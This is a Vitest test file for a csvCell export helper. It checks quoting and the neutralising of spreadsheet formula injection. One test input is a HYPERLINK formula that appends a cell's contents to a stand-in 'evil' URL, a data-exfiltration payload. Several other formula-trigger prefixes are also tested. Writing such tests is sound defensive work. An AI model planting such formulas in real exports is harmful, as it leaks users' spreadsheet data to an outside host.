import { describe, it, expect } from 'vitest';
import { csvCell } from '@/lib/csv';

describe('csvCell', () => {
  it('quotes, and doubles quotes inside', () => {
    expect(csvCell('Olivia "Liv" Smith')).toBe('"Olivia ""Liv"" Smith"');
    expect(csvCell('0412 345 678')).toBe('"0412 345 678"');
  });

  it('never lets a spreadsheet run a member’s text as a formula', () => {
    expect(csvCell('=HYPERLINK("https://evil/?"&B2,"x")')).toBe(`"'=HYPERLINK(""https://evil/?""&B2,""x"")"`);
    for (const v of ['+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1']) expect(csvCell(v).startsWith(`"'`), JSON.stringify(v)).toBe(true);
  });

  it('copes with empty values', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
});
